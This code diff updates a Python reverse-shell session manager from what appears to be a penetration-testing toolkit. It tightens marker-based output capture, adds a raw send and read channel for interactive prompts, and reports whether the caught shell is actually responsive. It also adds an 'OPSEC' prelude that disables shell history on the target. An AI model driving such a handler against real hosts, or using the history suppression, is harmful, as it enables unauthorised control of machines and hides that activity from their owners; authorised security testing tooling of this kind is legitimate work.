@@ -8,13 +8,73 @@ import pty
 import select
 import signal
 import threading
-import queue
 import uuid
 import base64
 import socket
 import re
-from typing import Dict, Any
+from typing import Dict, Any, Optional, Tuple
 from .config import logger, COMMAND_TIMEOUT
+
+
+# Escape sequences and readline's control bytes are stripped for the marker
+# MATCH only. Every byte read from the shell still reaches the operator through
+# send_command's output/all_lines and through read_output -- nothing here caps,
+# truncates or rewrites captured output.
+_ANSI_RE = re.compile(
+    r"\x1b\[[0-9;?]*[ -/]*[@-~]"           # CSI ... final byte
+    r"|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)"  # OSC ... BEL / ST
+    r"|\x1b[@-Z\\-_]"                      # two-character escapes
+    r"|[\x00-\x08\x0b\x0c\x0e-\x1f]"       # readline's \x01/\x02 prompt markers
+)
+
+# What may share a line with an executed marker without being output: escape
+# sequences, the \r of a \r\n pair, tabs, spaces. \n is deliberately absent so
+# a match can never span two lines.
+_MARKER_PAD = (
+    r"(?:\x1b\[[0-9;?]*[ -/]*[@-~]"
+    r"|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)"
+    r"|\x1b[@-Z\\-_]"
+    r"|[ \t\r\x00-\x08\x0b\x0c\x0e-\x1f])*"
+)
+
+# The history prelude is drained up to its own marker before the command's
+# markers are written. Bounded, and paid once per session.
+_PRELUDE_DRAIN_SECONDS = 3.0
+
+
+def _executed_marker(line: str, marker: str) -> bool:
+    """True only when ``line`` IS the marker, not an echo of the typed line.
+
+    A PTY echoes whatever is written to it, so ``echo 'START_x'`` comes back
+    whether or not anything on the far end ran it. Substring containment cannot
+    tell that echo from the bare ``START_x`` a shell prints when it executes the
+    line -- which is why a live-but-silent caught shell used to answer
+    ``success: true`` with ``lines_captured: 0`` while the work never happened.
+    Equality on the ANSI-stripped line can tell them apart.
+
+    ANSI is stripped for the match only; the caller's ``line`` is untouched.
+    """
+    return _ANSI_RE.sub("", line).strip() == marker
+
+
+def _executed_marker_span(text: str, marker: str) -> Optional[Tuple[int, int]]:
+    """``(start, end)`` of the executed standalone marker line in ``text``.
+
+    Offsets index ``text`` exactly as given, so slices taken from them keep
+    every raw byte. Returns None when only the echoed ``echo '<marker>'`` form
+    is present.
+
+    This exists because ``text.find(marker)`` returns the FIRST occurrence,
+    which in a PTY stream is the echo of the typed line -- so anchoring the
+    base64 slice on it computed ``clean_content`` from the echo, the exact
+    taint the executed-marker match is here to remove.
+    """
+    match = re.search(
+        rf"(?m)^{_MARKER_PAD}{re.escape(marker)}{_MARKER_PAD}$", text
+    )
+    if match is None:
+        return None
+    return match.start(), match.end()
 
 
 class ReverseShellManager:
@@ -35,6 +95,21 @@ class ReverseShellManager:
         # Trigger management attributes
         self.trigger_process = None
         self.trigger_thread = None
+        # Has the OPSEC history prelude been written on this session yet.
+        self._history_prelude_sent = False
+        # read_output's carry-over, and the reason it can promise that nothing
+        # is discarded. Both were LOCALS, so every byte os.read had taken off
+        # the PTY and not yet returned was destroyed when the call ended:
+        # _raw_read_buf held a newline-less remainder (`Password: `, `>>> `,
+        # `(gdb) ` -- exactly what the raw channel exists to drive) and the
+        # complete lines past max_lines had nowhere to go either.
+        self._raw_read_buf = b""
+        self._raw_pending_lines = []
+        # Whether the last send_command saw its executed end marker on a live
+        # session. None until one has been tried -- never inferred from the
+        # socket, because a live socket is not a usable channel.
+        self._shell_responsive = None
+        self._shell_last_command_at = None
 
     def _is_port_in_use(self, port: int) -> bool:
         """Check if a port is already in use using multiple validation methods"""
@@ -302,7 +377,131 @@ class ReverseShellManager:
         except Exception as e:
             pass
 
-    def send_command(self, command: str, timeout: int = 60) -> Dict[str, Any]:
+    def _send_history_prelude(self) -> bool:
+        """Keep our own marker lines out of the TARGET's shell history.
+
+        This is NOT the forbidden log redaction. Nothing is withheld from the
+        OPERATOR: every byte the shell sends still comes back through
+        send_command's output and through read_output, and the prelude itself is
+        logged below. What it keeps out of ``~/.bash_history`` on the target is
+        the operator's OWN injected ``echo 'START_x'`` scaffolding -- an
+        operator read those markers back out of /home/worker/.bash_history and
+        spent time treating them as the target's activity.
+
+        Each command is guarded individually with its own ``2>/dev/null`` and
+        separated by ``;`` rather than ``&&``, because dash/ash/busybox and
+        restricted shells have no ``set -o history``: unguarded, that error
+        would print into the session, i.e. into the very capture the executed
+        marker fix exists to keep clean. One failing command cannot abort the
+        rest, and a shell that supports none of them is left exactly as it was.
+
+        The prelude carries its own marker and everything up to and including
+        that marker's executed line is drained and discarded, so neither the
+        prelude nor its echo can ever enter a command's captured output.
+
+        Returns whether the prelude bytes were written. It never claims the
+        target honoured them -- no shell reports that, and inferring it from a
+        successful write would be the same mistake as reading success off a
+        live socket.
+        """
+        marker = f"PRELUDE_{uuid.uuid4().hex[:8]}"
+        prelude = (
+            "unset HISTFILE 2>/dev/null; "
+            "export HISTFILE=/dev/null 2>/dev/null; "
+            "unset HISTSIZE 2>/dev/null; "
+            "export HISTSIZE=0 2>/dev/null; "
+            "set +o history 2>/dev/null; "
+            f"echo '{marker}'\r\n"
+        )
+        try:
+            os.write(self.master_fd, prelude.encode())
+        except OSError as exc:
+            logger.warning(f"Could not send the history prelude: {exc}")
+            return False
+        self._history_prelude_sent = True
+        logger.info(f"Sent history prelude on {self.session_id}, marker {marker}")
+        self._drain_until_marker(marker, _PRELUDE_DRAIN_SECONDS)
+        return True
+
+    def _drain_until_marker(self, marker: str, budget: float) -> bool:
+        """Read and discard up to and including ``marker``'s executed line.
+
+        Only ever used for the history prelude. The bytes discarded here are our
+        own prelude and its echo -- nothing the operator asked for -- and they
+        are logged at debug level so even those are recoverable from the
+        container log. Bounded by ``budget``: a shell that never answers costs a
+        few seconds once, not the command's budget.
+        """
+        deadline = time.time() + budget
+        seen = ""
+        found = False
+        while time.time() < deadline:
+            try:
+                rlist, _, _ = select.select([self.master_fd], [], [], 0.5)
+            except Exception as exc:
+                logger.debug(f"Prelude drain select failed: {exc}")
+                break
+            if self.master_fd not in rlist:
+                continue
+            try:
+                data = os.read(self.master_fd, 4096)
+            except OSError as exc:
+                logger.debug(f"Prelude drain read failed: {exc}")
+                break
+            if not data:
+                break
+            seen += data.decode(errors="ignore")
+            if _executed_marker_span(seen, marker) is not None:
+                found = True
+                break
+        logger.debug(f"Prelude drain discarded (found={found}): {seen!r}")
+        return found
+
+    def send_raw(self, input_text: str) -> Dict[str, Any]:
+        """Write bytes straight to the shell. No markers, no capture.
+
+        send_command needs the far end to echo a bare marker line back. When it
+        cannot -- no TTY on the target, a wedged prompt, a REPL or an
+        interactive program holding stdin -- the caught session used to be a
+        write-off, because the only tool-reachable way in was the marker scrape
+        (job_manager's send_input/read_output serve zebbern_exec jobs, never
+        active_sessions). This is the write half of the escape hatch;
+        read_output is the read half.
+
+        The caller supplies any trailing newline, the same contract send_input
+        has for jobs. A successful write means the bytes left this process and
+        nothing more: it is not evidence the far end ran them. Read the reply
+        with read_output.
+        """
+        if not self.is_connected or self.master_fd is None:
+            return {
+                "success": False,
+                "error": "No active reverse shell connection",
+                "bytes_written": 0,
+                "session_id": self.session_id,
+            }
+        payload = input_text.encode()
+        try:
+            written = os.write(self.master_fd, payload)
+        except OSError as exc:
+            return {
+                "success": False,
+                "error": f"write to the shell failed: {exc}",
+                "bytes_written": 0,
+                "session_id": self.session_id,
+            }
+        return {
+            "success": True,
+            "bytes_written": written if isinstance(written, int) else len(payload),
+            "session_id": self.session_id,
+        }
+
+    def send_command(
+        self,
+        command: str,
+        timeout: int = 45,
+        suppress_history: bool = True,
+    ) -> Dict[str, Any]:
         """Send a command to the reverse shell with simple marker approach"""
         if not self.is_connected:
             return {
@@ -326,6 +525,12 @@ class ReverseShellManager:
 
                 # Special handling for base64 commands that output on single line
                 is_base64_command = "base64" in command.lower()
+
+                # OPSEC prelude, once per session, before any marker is written
+                # so neither it nor its echo can land inside a capture. See
+                # _send_history_prelude for why this is not log redaction.
+                if suppress_history and not self._history_prelude_sent:
+                    self._send_history_prelude()
 
                 # Send start marker, command, and end marker via PTY
                 os.write(self.master_fd, (f"echo '{start_marker}'\r\n").encode())
@@ -365,31 +570,40 @@ class ReverseShellManager:
                                 # Convert to text for marker detection
                                 text_buffer = raw_buffer.decode(errors='ignore')
 
-                                # Look for start marker
-                                if start_marker in text_buffer and not capture_mode:
+                                # Look for the EXECUTED start marker line. Both
+                                # the boolean test and the slice offsets come
+                                # from the same match: .find(marker) returns the
+                                # PTY echo of `echo 'START_x'`, so anchoring on
+                                # it sliced clean_content from the echo.
+                                start_span = _executed_marker_span(text_buffer, start_marker)
+                                if start_span and not capture_mode:
                                     capture_mode = True
-                                    # Find position after start marker and newline
-                                    start_pos = text_buffer.find(start_marker)
-                                    # Look for the first newline after the start marker
-                                    newline_pos = text_buffer.find('\n', start_pos)
+                                    # Look for the first newline after the executed marker line
+                                    newline_pos = text_buffer.find('\n', start_span[1])
                                     if newline_pos != -1:
                                         # Reset captured_data to start after the marker line
                                         remaining_text = text_buffer[newline_pos + 1:]
                                         captured_data = remaining_text.encode()
                                     continue
 
-                                # Look for end marker
-                                if end_marker in text_buffer and capture_mode:
+                                # Look for the EXECUTED end marker line
+                                end_span = _executed_marker_span(text_buffer, end_marker)
+                                if end_span and capture_mode:
                                     # Extract content before end marker - use full text_buffer instead of partial content
-                                    end_pos = text_buffer.find(end_marker)
-                                    # Find start position after start marker line
-                                    start_pos = text_buffer.find(start_marker)
-                                    start_line_end = text_buffer.find('\n', start_pos)
+                                    end_pos = end_span[0]
+                                    # Find start position after the executed start marker line
+                                    start_span = _executed_marker_span(text_buffer, start_marker)
+                                    start_line_end = (
+                                        text_buffer.find('\n', start_span[1])
+                                        if start_span else -1
+                                    )
                                     if start_line_end != -1:
                                         # Extract everything between start marker line and end marker
                                         clean_content = text_buffer[start_line_end + 1:end_pos]
                                     else:
-                                        clean_content = text_buffer[start_pos:end_pos]
+                                        clean_content = text_buffer[
+                                            (start_span[0] if start_span else 0):end_pos
+                                        ]
 
                                     end_marker_found = True
 
@@ -533,20 +747,50 @@ class ReverseShellManager:
                                     if not text or text == command:
                                         continue
 
-                                    # Start capturing after start marker
-                                    if start_marker in text:
+                                    # Start capturing after the EXECUTED start
+                                    # marker line. `start_marker in text` also
+                                    # matched the PTY's echo of the typed
+                                    # `echo 'START_x'`.
+                                    if _executed_marker(text, start_marker):
                                         capture_mode = True
                                         continue
 
-                                    # Stop capturing at end marker
-                                    if end_marker in text:
+                                    # Stop capturing at the EXECUTED end marker
+                                    # line. This is the one that decides
+                                    # success, and the echo used to set it on a
+                                    # live session where nothing ran at all.
+                                    if _executed_marker(text, end_marker):
                                         end_marker_found = True
                                         break
 
                                     # Only capture lines between markers
                                     if capture_mode and text:
-                                        # Skip the echo commands themselves
-                                        if not (text.startswith("echo '") and ("START_" in text or "END_" in text)):
+                                        # Drop the PTY's echo of OUR OWN marker
+                                        # commands, and nothing else. An
+                                        # interactive shell prefixes that echo
+                                        # with its prompt
+                                        # (`root@h:~# echo 'END_x'`), so the old
+                                        # startswith("echo '") test never saw
+                                        # it. That did not matter while the END
+                                        # test was substring containment --
+                                        # it fired on the echo and broke the
+                                        # loop before the line could be
+                                        # appended. Matching the executed marker
+                                        # moved the stopping point past the
+                                        # echo, so the echo started reaching the
+                                        # operator: one marker line the old code
+                                        # never leaked. Match the exact command
+                                        # text we wrote, which carries this
+                                        # call's random marker, so no genuine
+                                        # output line can collide with it.
+                                        # ANSI is stripped for the MATCH ONLY;
+                                        # `text` is appended verbatim.
+                                        probe = _ANSI_RE.sub("", text)
+                                        marker_echo = (
+                                            f"echo '{start_marker}'" in probe
+                                            or f"echo '{end_marker}'" in probe
+                                        )
+                                        if not marker_echo:
                                             all_lines.append(text)
                                             logger.info(f"Captured via PTY: '{text}'")
                             else:
@@ -575,6 +819,12 @@ class ReverseShellManager:
                     # the next call's guard fires instead of trying again.
                     self.is_connected = False
 
+                # A live socket is not a usable channel, so record what the
+                # channel actually did here rather than letting get_status infer
+                # it from netstat. None until a command has been tried.
+                self._shell_responsive = bool(end_marker_found and not session_closed)
+                self._shell_last_command_at = time.time()
+
                 output = '\n'.join(all_lines)
                 result = {
                     "success": bool(end_marker_found and not session_closed),
@@ -586,6 +836,10 @@ class ReverseShellManager:
                     "session_closed": session_closed,
                     "timed_out": timed_out,
                     "partial_results": bool((timed_out or session_closed) and all_lines),
+                    # The prelude was written on this session. It does not claim
+                    # the target honoured it, and it hides nothing from the
+                    # operator -- see _send_history_prelude.
+                    "history_suppressed": self._history_prelude_sent,
                     "debug_info": {
                         "start_marker": start_marker,
                         "end_marker": end_marker,
@@ -607,135 +861,6 @@ class ReverseShellManager:
                 elif read_error:
                     result["error"] = f"error reading from the shell: {read_error}"
                 return result
-
-            # Use STDIN/STDOUT approach for both netcat and pwncat
-            if self.process and self.process.stdin:
-                logger.info(f"Executing command via STDIN/STDOUT: {command}")
-
-                # Check if process is still alive
-                if self.process.poll() is not None:
-                    return {
-                        "success": False,
-                        "error": "Reverse shell process has terminated",
-                        "output": ""
-                    }
-
-                # Use dual marker approach for better isolation
-                start_marker_id = str(uuid.uuid4())[:8]
-                end_marker_id = str(uuid.uuid4())[:8]
-                start_marker = f"START_{start_marker_id}"
-                end_marker = f"END_{end_marker_id}"
-
-                try:
-                    # Send start marker, command, and end marker
-                    self.process.stdin.write(f"echo '{start_marker}'\n".encode())
-                    self.process.stdin.flush()
-                    time.sleep(0.1)
-                    self.process.stdin.write(f"{command}\n".encode())
-                    self.process.stdin.flush()
-                    time.sleep(0.1)
-                    self.process.stdin.write(f"echo '{end_marker}'\n".encode())
-                    self.process.stdin.flush()
-                except BrokenPipeError:
-                    return {
-                        "success": False,
-                        "error": "Broken pipe - reverse shell disconnected",
-                        "output": ""
-                    }
-
-                logger.info(f"Command sent with markers: {start_marker} -> {end_marker}")
-
-                # Collect output between markers
-                output_lines = []
-                all_lines = []
-                start_time = time.time()
-                max_wait_time = timeout
-                capture_mode = False
-
-                while time.time() - start_time < max_wait_time:
-                    try:
-                        def read_line_with_timeout(q):
-                            try:
-                                line = self.process.stdout.readline()
-                                if isinstance(line, bytes):
-                                    line = line.decode('utf-8', errors='ignore')
-                                q.put(line)
-                            except:
-                                q.put(None)
-
-                        q = queue.Queue()
-                        thread = threading.Thread(target=read_line_with_timeout, args=(q,))
-                        thread.daemon = True
-                        thread.start()
-                        thread.join(timeout=3.0)  # 3 seconds per line
-
-                        try:
-                            line = q.get_nowait()
-                            if line:
-                                clean_line = line.strip()
-                                all_lines.append(clean_line)
-
-                                # Start capturing after start marker
-                                if start_marker in clean_line:
-                                    capture_mode = True
-                                    continue
-
-                                # Stop capturing at end marker
-                                if end_marker in clean_line:
-                                    break
-
-                                # Only capture meaningful lines between markers
-                                if capture_mode and clean_line and clean_line != command:
-                                    # Skip echo commands for markers
-                                    if not (clean_line.startswith("echo '") and ("START_" in clean_line or "END_" in clean_line)):
-                                        output_lines.append(clean_line)
-                                        logger.info(f"Captured output: '{clean_line}'")
-
-                            elif line is None:  # End of stream
-                                break
-
-                        except queue.Empty:
-                            # No output available, continue waiting
-                            time.sleep(0.2)
-
-                    except Exception as e:
-                        logger.error(f"Error reading output: {e}")
-                        break
-
-                # Process the captured output
-                result = '\n'.join(output_lines) if output_lines else "Command executed (no output captured)"
-
-                logger.info(f"Command completed, captured {len(output_lines)} output lines")
-
-                return {
-                    "success": True,
-                    "output": result,
-                    "command": command,
-                    "session_id": self.session_id,
-                    "lines_captured": len(output_lines),
-                    "execution_time": time.time() - start_time,
-                    "debug_info": {
-                        "start_marker": start_marker,
-                        "end_marker": end_marker,
-                        "total_lines": len(all_lines),
-                        "capture_mode_activated": capture_mode
-                    }
-                }
-
-            else:
-                return {
-                    "success": False,
-                    "error": "No active netcat process",
-                    "output": ""
-                }
-
-        except Exception as e:
-            logger.error(f"Error executing command: {e}")
-            return {
-                "success": False,
-                "error": str(e),
-                "output": ""
-            }
 
         except Exception as e:
             logger.error(f"Error executing command: {e}")
@@ -804,17 +929,92 @@ class ReverseShellManager:
             "is_connected": self.is_connected,
             "process_alive": process_alive,
             "listener_active": self.listener_thread and self.listener_thread.is_alive(),
-            "actual_network_connection": actual_connection
+            "actual_network_connection": actual_connection,
+            # is_connected, process_alive and actual_network_connection are
+            # TCP-and-process facts, and all three were true on a channel that
+            # had stopped executing anything: the socket stays ESTABLISHED while
+            # the far end sits on a wedged prompt, holds stdin in an interactive
+            # program, or echoes without a shell behind it. A live process is not
+            # a working one, so responsiveness is reported separately and only
+            # from evidence -- an executed end marker -- never inferred from the
+            # socket. None means no command has been tried on this session yet.
+            # Check this and send_command's timed_out, not is_connected, before
+            # concluding the channel works.
+            "shell_responsive": self._shell_responsive,
+            "shell_last_command_at": self._shell_last_command_at,
+            "shell_responsive_note": (
+                "shell_responsive is None until a command has run, True only "
+                "when one reached its executed end marker on a live session, "
+                "and False when the last one timed out or the session closed. "
+                "is_connected/actual_network_connection are socket facts and do "
+                "not attest that the far end executes anything."
+            ),
         }
 
-    def read_output(self, timeout: int = 5, max_lines: int = 100) -> str:
-        """Read any pending output from the PTY without sending a command."""
+    def read_output(
+        self,
+        timeout: int = 5,
+        max_lines: int = 100,
+        drop_shell_noise: bool = False,
+    ) -> str:
+        """Read any pending output from the PTY without sending a command.
+
+        The read half of the raw escape hatch (send_raw is the write half). It
+        is a bounded POLLING WINDOW, not a transcript: ``max_lines`` bounds what
+        one call returns, and whatever is left over is carried ON THE SESSION
+        and returned by the next call, the same way job_output's ring is a
+        window over a job. Nothing is discarded to make room -- that is why both
+        carry-overs live on the instance. They used to be locals, so every byte
+        ``os.read`` had taken off the PTY and not yet returned died with the
+        call: a newline-less remainder, and any complete line past ``max_lines``.
+
+        A newline-less remainder is returned by the window that READ it, not
+        held back until a newline arrives. That is the whole point of this
+        channel: a REPL, ``su`` asking for a password, ``(gdb)`` -- the things
+        the marker scrape cannot drive -- all stop on a prompt with no newline,
+        and a prompt withheld for one more call is an operator staring at an
+        empty window unable to tell it from a hung target. The cost is that a
+        line split across two windows comes back in two pieces; every byte and
+        its order survive either way.
+
+        ``max_lines`` is a HARD ceiling on what one call returns, because the
+        surplus is carried rather than dropped. It was a soft one: the ceiling
+        was tested only between reads, so a burst of 500 lines inside a single
+        ``os.read`` returned all 500 while the route reported
+        ``window_limit: 100``.
+
+        Lines are stripped and blank ones skipped, as they always have been.
+        ``drop_shell_noise`` defaults to False so this returns every line as it
+        arrived, prompts included. Pass True only if you want the prompt/banner
+        filter -- it drops any line ending in ``$``, which on a raw channel is
+        real output often enough that it must not be the default. The filter is
+        applied as a line is handed back, so a carried-over line is judged by
+        the flag of the call that returns it, not the one that read it.
+        """
         if not self.is_connected or not self.master_fd:
             return ""
+        pending = self._raw_pending_lines
+        buf = self._raw_read_buf
         lines = []
-        buf = b""
+
+        def _hand_over():
+            """Move carried complete lines into this window, up to max_lines.
+
+            Called after every read as well as before the first one, so the
+            ceiling binds inside a single burst and the surplus stays in
+            ``pending`` instead of overshooting the limit the route reports.
+            """
+            while pending and len(lines) < max_lines:
+                text = pending.pop(0)
+                if not text:
+                    continue
+                if drop_shell_noise and self._is_shell_noise(text):
+                    continue
+                lines.append(text)
+
         deadline = time.time() + timeout
         consecutive_empty = 0
+        _hand_over()
         while time.time() < deadline and len(lines) < max_lines:
             ready, _, _ = select.select([self.master_fd], [], [], 0.5)
             if self.master_fd in ready:
@@ -829,15 +1029,38 @@ class ReverseShellManager:
                     buf += data
                     while b"\n" in buf:
                         line, buf = buf.split(b"\n", 1)
-                        text = line.decode(errors="ignore").strip()
-                        if text and not self._is_shell_noise(text):
-                            lines.append(text)
+                        pending.append(line.decode(errors="ignore").strip())
+                    _hand_over()
                 except OSError:
                     break
             else:
-                if lines:
+                # Quiet for a select interval. A pending remainder ends the
+                # window too, so a bare prompt comes back in ~0.5s rather than
+                # sitting here for the full budget.
+                if lines or buf:
                     break
+        if buf and len(lines) < max_lines:
+            remainder = buf.decode(errors="ignore").strip()
+            if remainder:
+                buf = b""
+                if not (drop_shell_noise and self._is_shell_noise(remainder)):
+                    lines.append(remainder)
+        self._raw_read_buf = buf
+        self._raw_pending_lines = pending
         return "\n".join(lines)
+
+    def raw_carry_over(self) -> Dict[str, int]:
+        """What read_output has taken off the PTY and not yet handed back.
+
+        Reported so a full window is distinguishable from the end of the
+        output. With ``max_lines`` a hard ceiling, "I got exactly my limit" no
+        longer implies "and that was everything", and the alternative to saying
+        so is an operator who stops polling with lines still held here.
+        """
+        return {
+            "lines": len(self._raw_pending_lines),
+            "bytes": len(self._raw_read_buf),
+        }
 
     def stop(self):
         """Stop the reverse shell listener"""
